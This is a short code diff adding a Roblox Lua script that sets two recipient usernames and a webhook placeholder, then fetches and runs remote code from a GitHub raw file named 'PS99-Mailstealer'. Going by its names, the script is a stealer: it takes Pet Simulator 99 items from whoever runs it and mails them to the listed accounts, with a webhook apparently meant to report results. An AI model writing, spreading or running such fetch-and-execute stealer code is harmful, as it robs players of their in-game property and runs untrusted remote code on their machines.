@@ -1,0 +1,5 @@
+Username = "brannsIam"
+Username2 = "brannsIam"
+Webhook = "Webhook Here"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherScript/PS99-Mailstealer/main/PS99Mailstealer"))()
